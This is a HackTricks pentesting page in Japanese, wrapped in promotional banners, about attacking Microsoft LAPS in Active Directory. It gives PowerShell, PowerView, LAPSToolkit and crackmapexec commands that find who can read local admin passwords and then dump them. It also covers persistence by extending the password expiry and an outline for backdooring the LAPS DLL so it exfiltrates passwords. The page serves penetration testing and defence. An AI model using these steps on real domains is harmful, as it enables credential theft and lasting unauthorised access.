# LAPS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## 基本情報

Local Administrator Password Solution (LAPS) は、**管理者パスワード**を管理するためのツールであり、これらのパスワードは**ユニークでランダム化され、頻繁に変更される**もので、ドメインに参加しているコンピュータに適用されます。これらのパスワードはActive Directory内に安全に保存され、アクセス制御リスト（ACL）を通じて許可を与えられたユーザーのみがアクセスできます。クライアントからサーバーへのパスワードの送信のセキュリティは、**Kerberosバージョン5**と**高度な暗号化標準（AES）**の使用によって確保されています。

ドメインのコンピュータオブジェクトにおいて、LAPSの実装により、2つの新しい属性が追加されます：**`ms-mcs-AdmPwd`**と**`ms-mcs-AdmPwdExpirationTime`**。これらの属性は、それぞれ**平文の管理者パスワード**と**その有効期限**を保存します。

### 有効化されているか確認する
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS パスワードアクセス

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` から **生の LAPS ポリシーをダウンロード** し、次に [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) パッケージの **`Parse-PolFile`** を使用して、このファイルを人間が読みやすい形式に変換できます。

さらに、**ネイティブ LAPS PowerShell コマンドレット** は、アクセスできるマシンにインストールされている場合に使用できます:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView**を使用して、**誰がパスワードを読み取ることができるか、そしてそれを読むことができるか**を調べることもできます：
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) は、いくつかの機能を使って LAPS の列挙を容易にします。\
その一つは、**LAPS が有効なすべてのコンピュータ**のために **`ExtendedRights`** を解析することです。これにより、**LAPS パスワードを読み取るために特に委任されたグループ**が表示されます。これらはしばしば保護されたグループのユーザーです。\
**コンピュータ**をドメインに参加させた **アカウント** は、そのホストに対して `All Extended Rights` を受け取り、この権利により **パスワードを読み取る** 能力が与えられます。列挙により、ホスト上で LAPS パスワードを読み取ることができるユーザーアカウントが表示されることがあります。これにより、LAPS パスワードを読み取ることができる特定の AD ユーザーを **ターゲットにする** のに役立ちます。
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**
PowerShellにアクセスできない場合は、LDAPを使用してこの特権をリモートで悪用できます。
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
これは、ユーザーが読み取れるすべてのパスワードをダンプし、別のユーザーでより良い足場を得ることを可能にします。

## **LAPSの永続性**

### **有効期限**

管理者になったら、**パスワードを取得**し、**有効期限を未来に設定することによって**マシンが**パスワードを更新するのを防ぐ**ことが可能です。
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
パスワードは、**admin**が**`Reset-AdmPwdPassword`**コマンドレットを使用した場合、またはLAPS GPOで**パスワードの有効期限をポリシーで要求されるよりも長く設定しない**が有効になっている場合でもリセットされます。
{% endhint %}

### バックドア

LAPSの元のソースコードは[こちら](https://github.com/GreyCorbel/admpwd)にあります。したがって、コードにバックドアを仕込むことが可能です（例えば、`Main/AdmPwd.PS/Main.cs`の`Get-AdmPwdPassword`メソッド内）で、新しいパスワードを**外部に流出させるか、どこかに保存する**ことができます。

その後、新しい`AdmPwd.PS.dll`をコンパイルし、`C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`にアップロードします（そして、修正時間を変更します）。

## 参考文献
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
